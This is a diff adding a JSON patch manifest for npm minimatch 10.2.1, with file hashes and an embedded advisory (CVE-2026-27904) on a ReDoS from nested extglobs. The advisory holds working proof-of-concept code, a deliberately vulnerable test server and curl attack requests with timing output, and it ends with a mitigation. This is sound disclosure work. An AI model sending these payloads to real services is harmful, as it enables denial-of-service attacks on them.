@@ -1,0 +1,119 @@
+{
+  "patches": {
+    "pkg:npm/minimatch@10.2.1": {
+      "uuid": "a6ac5600-211e-4b05-984b-077dc54cc1ee",
+      "exportedAt": "Sat, 28 Feb 2026 21:52:27 GMT",
+      "files": {
+        "package/dist/commonjs/assert-valid-pattern.d.ts": {
+          "beforeHash": "fbb33fde60416311d4f773165728e974dba77e66ba9f449006a87f6bc25a65f0",
+          "afterHash": "06516a4b6b1fe6ba36500daf459f2127e1817b3f9e49f7e88847b7eeba7225ae"
+        },
+        "package/dist/commonjs/assert-valid-pattern.d.ts.map": {
+          "beforeHash": "ac11eb0a431b5b459c5b1c8bc77cf90d9b124a54c26acc132120ef32c0cb1160",
+          "afterHash": "ffd7c76286a2298443f38c849fb748a6bff7a63bee72afeb1ac5b6f3e5786974"
+        },
+        "package/dist/commonjs/assert-valid-pattern.js.map": {
+          "beforeHash": "11d97540fbd4b49f9a3b7c8fb49277aa4a8117d482e3ff690bccea65767acd22",
+          "afterHash": "972cf5fcb0c4b1a5edae362082ea67d14e8f1b9cade9b137078bd4ecafcebf25"
+        },
+        "package/dist/commonjs/ast.d.ts": {
+          "beforeHash": "babdc02ab712bd89367047f4baf13f266d4a0dcb0b32c746e1c5f0952025c379",
+          "afterHash": "69777a691976b87e9724b3db8a7e31ca9d0e7bbe1f1b69c948f878b5843fd3a4"
+        },
+        "package/dist/commonjs/ast.d.ts.map": {
+          "beforeHash": "92d24d47e30a0451f291d2d0afb179567e1d2dec9f95f6152da411cbd8d57f6b",
+          "afterHash": "ba02dd91aecf67086930fa37e5cf1bcc8930660fd0026c0eed296f04a3106c67"
+        },
+        "package/dist/commonjs/ast.js": {
+          "beforeHash": "8e20959a0ba6f5e7035e94f36974aade623611e2839e6cfaf501ec2aecd1893b",
+          "afterHash": "3681c3b8564e694156020f578e0224e3afd72976fc0093a23c80fa1f20b8b75a"
+        },
+        "package/dist/commonjs/ast.js.map": {
+          "beforeHash": "95651cebc2b87cdedc263aff21b0cfc24520a3f94aefdba8df4b4b977ab95b55",
+          "afterHash": "5e7b269c5139460417c2cae5103345e56dfafdf93ddd0d7d84c0726ce961b86d"
+        },
+        "package/dist/commonjs/index.d.ts": {
+          "beforeHash": "0556221103ee4e78adff7ce875bfeacad86fd1e4de956a9cc790c85796b14b10",
+          "afterHash": "47f5f9c705960d3049b9760d858f68167950307ec9cd974d9b77d85fce0927d8"
+        },
+        "package/dist/commonjs/index.d.ts.map": {
+          "beforeHash": "0285144e08e7c21c05ab0f5b303a35aae6fc55c03d24ac89879d2e4d43950a85",
+          "afterHash": "4e73b999b36db2daeea130e81c3b26af0307899df9dd8d8ae51934367d17a5bb"
+        },
+        "package/dist/commonjs/index.js": {
+          "beforeHash": "a0c27cef493b7a2cda7db5117f4f6dd1c9ff697d4b5ad6502137fcf0b3e0133b",
+          "afterHash": "0930eb0a8719a420c72ef910dd71df5a5ad4cb373bb77c57794ad5488642734c"
+        },
+        "package/dist/commonjs/index.js.map": {
+          "beforeHash": "3bfa746091a9a44419b0fc8815b54031e64d93c0a431f32ecd724536f7b0c36a",
+          "afterHash": "c54492576426c8fa17bddaf0ca8710df0b3519c32b176e8805b5b04fe72ba376"
+        },
+        "package/dist/esm/assert-valid-pattern.d.ts": {
+          "beforeHash": "fbb33fde60416311d4f773165728e974dba77e66ba9f449006a87f6bc25a65f0",
+          "afterHash": "06516a4b6b1fe6ba36500daf459f2127e1817b3f9e49f7e88847b7eeba7225ae"
+        },
+        "package/dist/esm/assert-valid-pattern.d.ts.map": {
+          "beforeHash": "ac11eb0a431b5b459c5b1c8bc77cf90d9b124a54c26acc132120ef32c0cb1160",
+          "afterHash": "ffd7c76286a2298443f38c849fb748a6bff7a63bee72afeb1ac5b6f3e5786974"
+        },
+        "package/dist/esm/assert-valid-pattern.js.map": {
+          "beforeHash": "18e0b6b86a966f60a31378a931614b2049421a682519758353649bc92955855d",
+          "afterHash": "bc3f2c18a6852ca70b8f6f6f32e0cacfd22284c646c998acd8ac9c105795f2d1"
+        },
+        "package/dist/esm/ast.d.ts": {
+          "beforeHash": "babdc02ab712bd89367047f4baf13f266d4a0dcb0b32c746e1c5f0952025c379",
+          "afterHash": "69777a691976b87e9724b3db8a7e31ca9d0e7bbe1f1b69c948f878b5843fd3a4"
+        },
+        "package/dist/esm/ast.d.ts.map": {
+          "beforeHash": "92d24d47e30a0451f291d2d0afb179567e1d2dec9f95f6152da411cbd8d57f6b",
+          "afterHash": "ba02dd91aecf67086930fa37e5cf1bcc8930660fd0026c0eed296f04a3106c67"
+        },
+        "package/dist/esm/ast.js": {
+          "beforeHash": "0965a86ba69c223137cb2d89348265906fd31143b33a1b131697a90dde5defb5",
+          "afterHash": "0fc09a3a08ce0baa10ae7a99a0fa717326d5285fc56374a8f9ec63ebb2c54580"
+        },
+        "package/dist/esm/ast.js.map": {
+          "beforeHash": "cdda0dc3fd4a6d6299f09137f23b50193b5a5ecdc12d8bd4658edcbaab2729b5",
+          "afterHash": "7e25dacc8a109c3e647b690cf9044214a0f1436c54675f150a00303132b676d5"
+        },
+        "package/dist/esm/index.d.ts": {
+          "beforeHash": "0556221103ee4e78adff7ce875bfeacad86fd1e4de956a9cc790c85796b14b10",
+          "afterHash": "47f5f9c705960d3049b9760d858f68167950307ec9cd974d9b77d85fce0927d8"
+        },
+        "package/dist/esm/index.d.ts.map": {
+          "beforeHash": "0285144e08e7c21c05ab0f5b303a35aae6fc55c03d24ac89879d2e4d43950a85",
+          "afterHash": "4e73b999b36db2daeea130e81c3b26af0307899df9dd8d8ae51934367d17a5bb"
+        },
+        "package/dist/esm/index.js": {
+          "beforeHash": "34dcc0a5b8aaa8efc2e30d4f47a2aabd23621441e52ec92cc052d1e67b9c94bf",
+          "afterHash": "a85b66bb9af923a36276d39a171e3c0dded3fc10c98d5e23ac2e72cebad3c716"
+        },
+        "package/dist/esm/index.js.map": {
+          "beforeHash": "3873a2c7d43663715fb3e0182cdcc2fb5b9cb4741e029b4e5283ed9e56d58893",
+          "afterHash": "320832bd2c3de2a19478072c928888471d9a8705e9dc871bc3598624a25e3651"
+        },
+        "package/package.json": {
+          "beforeHash": "9f8808f5d39d809cf462a8973245bfaedad2b7b1d01cd48d4b259a2964178d0c",
+          "afterHash": "c607aaada32c41e3a229db5f1901679a92b222a188d33ac40faafc94edc8c5d3"
+        },
+        "package/README.md": {
+          "beforeHash": "bf9751e7d8aa075a4003ebe554951f7fcf7ffbf50ff26d8363beda0c39f73dad",
+          "afterHash": "3838b9190a93e5e0456888d5627a133db514d110dd40468ab628f0dbc57b7c03"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-23c5-xmqv-rm74": {
+          "cves": [
+            "CVE-2026-27904"
+          ],
+          "summary": "minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions",
+          "severity": "HIGH",
+          "description": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
+    }
+  }
+}
